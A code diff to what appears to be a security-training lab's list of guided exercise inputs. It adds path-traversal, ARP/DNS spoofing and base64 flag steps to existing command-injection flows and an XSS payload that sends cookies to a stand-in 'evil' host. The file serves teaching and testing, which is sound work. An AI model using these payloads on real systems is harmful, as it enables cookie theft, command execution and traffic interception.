@@ -37,7 +37,10 @@ const flows: Record<string, string[]> = {
     "payload <img src=x onerror=\"new Image().src='//evil/?c='+document.cookie\">"
   ],
   "cmdi-guided": ["ping 127.0.0.1", "ping 127.0.0.1; whoami", "ping 127.0.0.1; cat flag.txt"],
-  "hijack-guided": ["sniff", "replay d4e5f6a1b2"]
+  "hijack-guided": ["sniff", "replay d4e5f6a1b2"],
+  "traversal-guided": ["get avatar.png", "get ../config.txt", "get ../../../etc/app/secret.conf"],
+  "spoofing-guided": ["arpspoof 192.168.1.24 192.168.1.1", "dnsspoof bank.local", "harvest"],
+  "crypto-guided": ["cipher", "b64 TUhCe2NyMXB0MF9ndTE0ZDB9"]
 };
 
 for (const lab of ENGINE_GUIDED) {
